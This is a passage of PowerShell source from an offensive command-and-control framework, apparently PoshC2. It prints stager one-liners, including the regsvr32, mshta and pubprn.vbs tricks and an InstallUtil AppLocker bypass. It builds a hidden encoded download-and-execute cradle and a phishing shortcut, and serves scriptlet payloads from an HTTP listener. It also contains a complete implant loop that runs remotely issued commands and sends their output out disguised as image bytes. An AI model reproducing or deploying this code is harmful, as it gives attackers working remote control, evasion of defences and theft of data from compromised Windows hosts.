    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds, URLS)
            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds, @URLS)'

    Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
        DefaultSleep = $defaultbeacon
        KillDate = $killdatefm
        HostnameIP  = $ipv4address
        DomainFrontHeader  = $domainfrontheader
        HTTPResponse = $httpresponse
        FolderPath = $global:newdir
        ServerPort = $serverport
        QuickCommand = $shortcut
        DownloadURI = $downloaduri
        Sounds = $enablesound
        URLS = $urlstring
    } | Out-Null

    Write-Host `n"Apache rewrite rules written to: $global:newdir\apache.conf" -ForegroundColor Green
    Out-File -InputObject $apache -Encoding ascii -FilePath "$global:newdir\apache.conf"
        
    Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill Date $killdatefm"`n -ForegroundColor Green
    Write-Host "To quickly get setup for internal pentesting, run:"

    write-host $shortcut `n -ForegroundColor green
    Write-Host "For a more stealthy approach, use SubTee's exploits:"
    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`"" -ForegroundColor green
    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg`")(window.close)" -ForegroundColor green
    write-host ""
    Write-Host "To Bypass AppLocker or Bit9, use InstallUtil.exe found by SubTee:"
    write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
    write-host ""
    Write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
    write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
    write-host ""
    # call back command
    $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
function Get-Webclient ($Cookie) {
$d = (Get-Date -Format "dd/MM/yyyy");
$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null);
if ($k -lt $d) {exit} 
$wc = New-Object System.Net.WebClient; 
$wc.UseDefaultCredentials = $true; 
$wc.Proxy.Credentials = $wc.Credentials;
$h="'+$domainfrontheader+'"
if ($h) {$wc.Headers.Add("Host",$h)}
$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
if ($cookie) {
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
} $wc }
function primer {
if ($env:username -eq $env:computername+"$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
$p64 = [Convert]::ToBase64String($pre)
$pm = (Get-Webclient -Cookie $p64).downloadstring("'+$ipv4address+":"+$serverport+'/connect")
$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
$pm } 
$pm = primer
if ($pm) {$pm| iex} else {
start-sleep 10
primer | iex }'
    Write-Host -Object "For " -NoNewline
    Write-Host -Object "Red Teaming " -NoNewline -ForegroundColor Red
    Write-Host -Object "activities, use the following payloads:" 
    # create payloads
    if ($JDKPath){
        CreateJavaPayload
    } else {
        write-host "Java JDK installer was not found, as a result it cannot create .jar file: "$JDKPath
    }
    # create other payloads

    CreatePayload
    CreateHTAPayload
    CreateMacroPayload
    Create-MS16-051-Payload
    CreateStandAloneExe
    CreateServiceExe
    
    Start-Sleep 3
    $t = IEX "$PoshPath\DotNetToJS\DotNetToJScript.exe -c Program -o `"$global:newdir\payloads\posh.js`" `"$global:newdir\payloads\posh.exe`""|Out-Null
    Write-Host -Object "DotNetToJS Created .js Payload written to: $global:newdir\payloads\posh.js"  -ForegroundColor Green
    
    Write-Host -Object "Phishing .lnk Payload written to: $global:newdir\payloads\PhishingAttack-Link.lnk"  -ForegroundColor Green

    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""

    
    #launch a new powershell session with the implant handler running
    Start-Process -FilePath powershell.exe -ArgumentList " -NoP -Command import-module $PoshPath\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir' -PoshPath '$PoshPath'"
    Write-Host `n"To re-open the Implant-Handler or C2Server, use the following shortcuts in this directory: "
    Write-Host "$global:newdir" `n  -ForegroundColor Green
    $SourceExe = "powershell.exe"
    $ArgumentsToSourceExe = "-exec bypass -c import-module ${PoshPath}C2-Server.ps1;C2-Server -RestartC2Server '$global:newdir' -PoshPath '$PoshPath'"
    $DestinationPath = "$global:newdir\Restart-C2Server.lnk"
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($DestinationPath)
    $Shortcut.TargetPath = $SourceExe
    $Shortcut.Arguments = $ArgumentsToSourceExe
    $Shortcut.Save()
    # add run as administrator 
    $bytes = [System.IO.File]::ReadAllBytes("$global:newdir\Restart-C2Server.lnk")
    $bytes[0x15] = $bytes[0x15] -bor 0x20
    [System.IO.File]::WriteAllBytes("$global:newdir\Restart-C2Server.lnk", $bytes)

    $SourceExe = "powershell.exe"
    $ArgumentsToSourceExe = "-exec bypass -c import-module ${PoshPath}Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir' -PoshPath '$PoshPath'"
    $DestinationPath = "$global:newdir\Restart-Implant-Handler.lnk"
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($DestinationPath)
    $Shortcut.TargetPath = $SourceExe
    $Shortcut.Arguments = $ArgumentsToSourceExe
    $Shortcut.Save()

    $SourceExe = "powershell.exe"
    $ArgumentsToSourceExe = "-exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/webapp/static/$($downloaduri)')"+'"'+"" 
    $DestinationPath = "$global:newdir\payloads\PhishingAttack-Link.lnk"
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($DestinationPath)
    $Shortcut.TargetPath = $SourceExe
    $Shortcut.Arguments = $ArgumentsToSourceExe
    $Shortcut.WindowStyle = 7
    $Shortcut.Save()
}

# add as many images to the images directory as long as the images are less than 1500 bytes in size
$imageArray = @()
$imageFilesUsed = @()
$imageFiles = Get-ChildItem "$PoshPath\Images" | select FullName
$count = 0 

while ($count -lt 5) {

    $randomImage =  $imageFiles | Get-Random 
    $randomImage = $randomImage.FullName
    if (-not ($imageFilesUsed -contains $randomImage)){

        $imageBytes = Get-Content $randomImage -Encoding Byte

        if ($imageBytes.Length -lt 1495) {
            $imageFilesUsed += $randomImage
            $imageBytes = Get-Content $randomImage -Encoding Byte
            $imageArray += [Convert]::ToBase64String($imageBytes)
            $count = $count + 1
        }
    }
}

# C2 server component
$listener = New-Object -TypeName System.Net.HttpListener 

if ($ipv4address.Contains("https")) {
    $listener.Prefixes.Add("https://+:$serverport/") 
} else {
    $listener.Prefixes.Add("http://+:$serverport/") 
}
$readhost = 'PS >'
$listener.Start()

# while the HTTP server is listening do the grunt of the work
while ($listener.IsListening) 
{
    $message = $null
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response       
    if ($request.Url -match "/webapp/static/$($downloaduri)$") 
    {
        $message = $payload
    }
    if ($request.Url -match "/webapp/static/$($downloaduri)_ms16-051$")
    {
        $message = Get-Content -Path $global:newdir/payloads/ms16-051.html
    }
    if ($request.Url -match "/webapp/static/$($downloaduri)_rg$") 
    {

        $payloadparams = $payload -replace "powershell.exe ",""
        $message = '<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    >   
    <script language="VBScript">
        <![CDATA[
            Sub Exec()
            Dim objShell
            set objShell = CreateObject("shell.application")
            objShell.ShellExecute "powershell.exe", "'+$payloadparams+'", "", "open", 0
            End Sub
            Exec()
        ]]>
    </script>
</registration>
<public>
    <method name="Exec"></method>
</public>
<script language="VBScript">
    <![CDATA[
        Sub Exec()
        Dim objShell
        set objShell = CreateObject("shell.application")
        objShell.ShellExecute "powershell.exe", "'+$payloadparams+'", "", "open", 0
        End Sub
        Exec()
    ]]>
</script>

</scriptlet>'
    }
    if ($request.Url -match "/webapp/static/$($downloaduri)_cs$") 
    {

        $payloadparams = $payload -replace "powershell.exe ",""
        $message = '<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    remotable="true"
	>
</registration>

<script language="JScript">
<![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("'+$payload+'");	
]]>
</script>

</scriptlet>'
    }
    if (($request.Url -match '/daisy') -and (($request.Cookies[0]).Name -match 'SessionID'))
    {
        # generate randon uri
        $randomuri = Get-RandomURI -Length 15
        $randomuriarray += $randomuri

        # create new key for each implant comms
        $key = Create-AesKey
        $endpointip = $request.RemoteEndPoint
        $cookieplaintext = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(($request.Cookies[0]).Value))
        $im_domain,$im_username,$im_computername,$im_arch,$im_pid = $cookieplaintext.split(";",5)

        ## add anti-ir and implant safety mechanisms here!
        #
        # if ($im_domain -ne "blorebank") { do something }
        # if ($im_domain -ne "safenet") { do something }
        #
        ## add anti-ir and implant safety mechanisms here!

        Write-Host "New Daisy chain implant connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
        Write-Host "$endpointip | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green

        if ($enablesound -eq "Yes") {
            try {
            $voice = New-Object -com SAPI.SpVoice                        
            $voice.rate = -2                        
            $voice.Speak("Nice, we have a daisy chain implant")|Out-Null
            } catch {}
        }

        $Query = 'INSERT INTO Implants (RandomURI, User, Hostname, IpAddress, Key, FirstSeen, LastSeen, PID, Arch, Domain, Alive, Sleep, ModsLoaded)
        VALUES (@RandomURI, @User, @Hostname, @IpAddress, @Key, @FirstSeen, @LastSeen, @PID, @Arch, @Domain, @Alive, @Sleep, @ModsLoaded)'

        Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
            RandomURI = $randomuri
            User      = $im_username
            Hostname  = $im_computername
            IpAddress = $request.RemoteEndPoint
            Key       = $key
            FirstSeen = "$(Get-Date)"
            LastSeen  = "$(Get-Date)"
            PID  = $im_pid
            Arch = $im_arch
            Domain = $im_domain
            Alive = "Yes"
            Sleep = $defaultbeacon
            ModsLoaded = ""
        }

	    $autorunresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject        
 
        if ($autorunresults -ne $null){
			Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET ModsLoaded='implant-core.ps1' WHERE RandomURI='$randomuri'"|Out-Null
			$query = "INSERT INTO NewTasks (RandomURI, Command)
			VALUES (@RandomURI, @Command)"
			
			Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
			RandomURI = $randomuri
			Command   = "LoadModule implant-core.ps1"
			} | Out-Null
			
            foreach ($i in $autorunresults) {
                $taskee = $i.Task
                			
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
			    RandomURI = $randomuri
			    Command   = $taskee
                } | Out-Null
			
            }
		}

        $message = '

$key="' + "$key"+'"
$sleeptime = '+$defaultbeacon+'
$payload = "' + "$payload"+'"

function getimgdata($cmdoutput) {
    $icoimage = "'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'"`,"'+$imageArray[2]+'","'+$imageArray[3]+'"
    $image = $icoimage|get-random

    function randomgen 
    {
        param (
            [int]$Length
        )
        $set = "...................@..........................Tyscf".ToCharArray()
        $result = ""
        for ($x = 0; $x -lt $Length; $x++) 
        {$result += $set | Get-Random}
        return $result
    }
    $imageBytes = [Convert]::FromBase64String($image)
    $maxbyteslen = 1500
    $imagebyteslen = $imageBytes.Length
    $paddingbyteslen = $maxbyteslen - $imagebyteslen

    $BytePadding = [system.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
    $ImagePlusPad = New-Object byte[] $maxbyteslen
    $ImagePlusPadBytes = ($imageBytes+$BytePadding)
    $CombinedBytes = $ImagePlusPadBytes.length

    $CmdBytes = $cmdoutput
    $CmdBytesLen = $CmdBytes.Length

    $CombinedByteSize = $CmdBytesLen + $CombinedBytes
    $FullBuffer = New-Object byte[] $CombinedByteSize

    $FullBuffer = ($ImagePlusPadBytes+$CmdBytes)
    $FullBufferSize = $FullBuffer.length
    return $FullBuffer
}

function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.RijndaelManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
    if ($IV.getType().Name -eq "String") {
    $aesManaged.IV = [System.Convert]::FromBase64String($IV)
    }
    else {
    $aesManaged.IV = $IV
    }
    }
    if ($key) {
    if ($key.getType().Name -eq "String") {
    $aesManaged.Key = [System.Convert]::FromBase64String($key)
    }
    else {
    $aesManaged.Key = $key
    }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    #$aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    #$aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
function Encrypt-String2($key, $unencryptedString) {
    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
    $DeflateStream.Dispose()
    $bytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $fullData
}
function Decrypt-String2($key, $encryptedStringWithIV) {
    $bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
    $output
    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
}
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$URI= "'+$randomuri+'"
$Server = "$server/'+$randomuri+'"
$ServerClean = $Server
while($true)
{
    $date = (Get-Date -Format "dd/MM/yyyy")
    $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
    $killdate = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null)
    if ($killdate -lt $date) {exit}
    $sleeptimeran = $sleeptime, ($sleeptime * 1.1), ($sleeptime * 0.9)
    $newsleep = $sleeptimeran|get-random
    if ($newsleep -lt 1) {$newsleep = 5} 
    start-sleep $newsleep
    $URLS = '+$urlstring+'
    $RandomURI = Get-Random $URLS
    $Server = "$ServerClean/$RandomURI$URI"
    $ReadCommand = (Get-Webclient).DownloadString("$Server")

     while($ReadCommand) {
        $ReadCommandClear = Decrypt-String $key $ReadCommand
        $error.clear()
        if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
            if  ($ReadCommandClear.ToLower().StartsWith("multicmd")) {
                    $splitcmd = $ReadCommandClear -replace "multicmd",""
                    $split = $splitcmd -split "!d-3dion@LD!-d"
                    foreach ($i in $split){
                        $error.clear()
                        if  ($i.ToLower().StartsWith("upload-file")) {
                            try {
                                $Output = Invoke-Expression $i | out-string
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                                $ModuleLoaded = Encrypt-String $key $result
                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorUpload: " + $error[0]
                            }
                        } elseif  ($i.ToLower().StartsWith("loadmodule")) {
                            try {
                                $modulename = $i -replace "LoadModule",""
                                $Output = Invoke-Expression $modulename | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorLoadMod: " + $error[0]
                            }
                        } else {
                            try {
                                $Output = Invoke-Expression $i | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $StdError = ($error[0] | Out-String)
                                if ($StdError){
                                $Output = $Output + $StdError
                                $error.clear()
                                }
                            } catch {
                                $Output = "ErrorCmd: " + $error[0]
                            }
                            $Output = Encrypt-String2 $key $Output
                            $Response = Encrypt-String $key $i
                            $UploadBytes = getimgdata $Output
                            (Get-Webclient -Cookie $Response).UploadData("$Server", $UploadBytes)|out-null
                        }
                    } 
            }
            elseif  ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
                try {
                $Output = Invoke-Expression $ReadCommandClear | out-string
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                $ModuleLoaded = Encrypt-String $key $result
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorUpload: " + $error[0]
                }

            } elseif  ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
                try {
                $modulename = $ReadCommandClear -replace "LoadModule",""
                $Output = Invoke-Expression $modulename | out-string  
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorLoadMod: " + $error[0]
                }

            } else {
                try {
                    $Output = Invoke-Expression $ReadCommandClear | out-string  
                    $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                    $StdError = ($error[0] | Out-String)
                    if ($StdError){
                    $Output = $Output + $StdError
                    $error.clear()
                    }
                } catch {
                    $Output = "ErrorCmd: " + $error[0]
                }

            $Output = Encrypt-String2 $key $Output
            $UploadBytes = getimgdata $Output
            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null

            }
        }
    break
    }
}'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)
$message =[Convert]::ToBase64String($Bytes)

    }
    if (($request.Url -match '/connect') -and (($request.Cookies[0]).Name -match 'SessionID'))
    {
        # generate randon uri
        $randomuri = Get-RandomURI -Length 15
        $randomuriarray += $randomuri

        # create new key for each implant comms
        $key = Create-AesKey
        $endpointip = $request.RemoteEndPoint
        $cookieplaintext = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(($request.Cookies[0]).Value))
        $im_domain,$im_username,$im_computername,$im_arch,$im_pid = $cookieplaintext.split(";",5)

        ## add anti-ir and implant safety mechanisms here!
        #
        # if ($im_domain -ne "blorebank") { do something }
        # if ($im_domain -ne "safenet") { do something }
        #
        ## add anti-ir and implant safety mechanisms here!

        Write-Host "New host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
        Write-Host "$endpointip | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green

        # optional clockwork sms on new implant
        $mobilenumber = ""
        $apikey = ""
        if (($apikey) -and ($mobilenumber)){
            (New-Object System.Net.Webclient).DownloadString("https://api.clockworksms.com/http/send.aspx?key=$apikey&to=$mobilenumber&from=PoshC2&content=$im_computername")|Out-Null
        }

        if ($enablesound -eq "Yes") {
            try {
            $voice = New-Object -com SAPI.SpVoice                        
            $voice.rate = -2                        
            $voice.Speak("Nice, we have an implant")|Out-Null
            } catch {}
        }

        $Query = 'INSERT INTO Implants (RandomURI, User, Hostname, IpAddress, Key, FirstSeen, LastSeen, PID, Arch, Domain, Alive, Sleep, ModsLoaded)
        VALUES (@RandomURI, @User, @Hostname, @IpAddress, @Key, @FirstSeen, @LastSeen, @PID, @Arch, @Domain, @Alive, @Sleep, @ModsLoaded)'

        Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
            RandomURI = $randomuri
            User      = $im_username
            Hostname  = $im_computername
            IpAddress = $request.RemoteEndPoint
            Key       = $key
            FirstSeen = "$(Get-Date)"
            LastSeen  = "$(Get-Date)"
            PID  = $im_pid
            Arch = $im_arch
            Domain = $im_domain
            Alive = "Yes"
            Sleep = $defaultbeacon
            ModsLoaded = ""
        }

	    $autorunresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject
        
        if ($autorunresults -ne $null){
			Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET ModsLoaded='implant-core.ps1' WHERE RandomURI='$randomuri'"|Out-Null
			$query = "INSERT INTO NewTasks (RandomURI, Command)
			VALUES (@RandomURI, @Command)"
			
			Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
			RandomURI = $randomuri
			Command   = "LoadModule implant-core.ps1"
			} | Out-Null
			
            foreach ($i in $autorunresults) {
                $taskee = $i.Task
                			
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
			    RandomURI = $randomuri
			    Command   = $taskee
                } | Out-Null
			
            }
		}

        $message = '

$key="' + "$key"+'"
$sleeptime = '+$defaultbeacon+'
$payload = "' + "$payload"+'"

function getimgdata($cmdoutput) {
    $icoimage = @("'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'","'+$imageArray[2]+'","'+$imageArray[3]+'")
    
    try {$image = $icoimage|get-random}catch{}

    function randomgen 
    {
        param (
            [int]$Length
        )
        $set = "...................@..........................Tyscf".ToCharArray()
        $result = ""
        for ($x = 0; $x -lt $Length; $x++) 
        {$result += $set | Get-Random}
        return $result
    }
    $imageBytes = [Convert]::FromBase64String($image)
    $maxbyteslen = 1500
    $imagebyteslen = $imageBytes.Length
    $paddingbyteslen = $maxbyteslen - $imagebyteslen

    $BytePadding = [system.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
    $ImagePlusPad = New-Object byte[] $maxbyteslen
    $ImagePlusPadBytes = ($imageBytes+$BytePadding)
    $CombinedBytes = $ImagePlusPadBytes.length

    $CmdBytes = $cmdoutput
    $CmdBytesLen = $CmdBytes.Length

    $CombinedByteSize = $CmdBytesLen + $CombinedBytes
    $FullBuffer = New-Object byte[] $CombinedByteSize

    $FullBuffer = ($ImagePlusPadBytes+$CmdBytes)
    $FullBufferSize = $FullBuffer.length
    return $FullBuffer
}

function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.RijndaelManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
    if ($IV.getType().Name -eq "String") {
    $aesManaged.IV = [System.Convert]::FromBase64String($IV)
    }
    else {
    $aesManaged.IV = $IV
    }
    }
    if ($key) {
    if ($key.getType().Name -eq "String") {
    $aesManaged.Key = [System.Convert]::FromBase64String($key)
    }
    else {
    $aesManaged.Key = $key
    }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    #$aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    #$aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
function Encrypt-String2($key, $unencryptedString) {
    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
    $DeflateStream.Dispose()
    $bytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $fullData
}
function Decrypt-String2($key, $encryptedStringWithIV) {
    $bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
    $output
    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
}
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$URI= "'+$randomuri+'"
$Server = "'+$ipv4address+":"+$serverport+'/'+$randomuri+'"
$ServerClean = "'+$ipv4address+":"+$serverport+'"

while($true)
{
    $date = (Get-Date -Format "dd/MM/yyyy")
    $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
    $killdate = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null)
    if ($killdate -lt $date) {exit}
    $sleeptimeran = $sleeptime, ($sleeptime * 1.1), ($sleeptime * 0.9)
    $newsleep = $sleeptimeran|get-random
    if ($newsleep -lt 1) {$newsleep = 5} 
    start-sleep $newsleep
    $URLS = '+$urlstring+'
    $RandomURI = Get-Random $URLS
    $Server = "$ServerClean/$RandomURI$URI"
    try { $ReadCommand = (Get-Webclient).DownloadString("$Server") } catch {}
    
    while($ReadCommand) {
        $ReadCommandClear = Decrypt-String $key $ReadCommand
        $error.clear()
        if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
            if  ($ReadCommandClear.ToLower().StartsWith("multicmd")) {
                    $splitcmd = $ReadCommandClear -replace "multicmd",""
                    $split = $splitcmd -split "!d-3dion@LD!-d"
                    foreach ($i in $split){
                        $error.clear()
                        if  ($i.ToLower().StartsWith("upload-file")) {
                            try {
                                $Output = Invoke-Expression $i | out-string
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                                $ModuleLoaded = Encrypt-String $key $result
                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorUpload: " + $error[0]
                            }
                        } elseif  ($i.ToLower().StartsWith("loadmodule")) {
                            try {
                                $modulename = $i -replace "LoadModule",""
                                $Output = Invoke-Expression $modulename | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
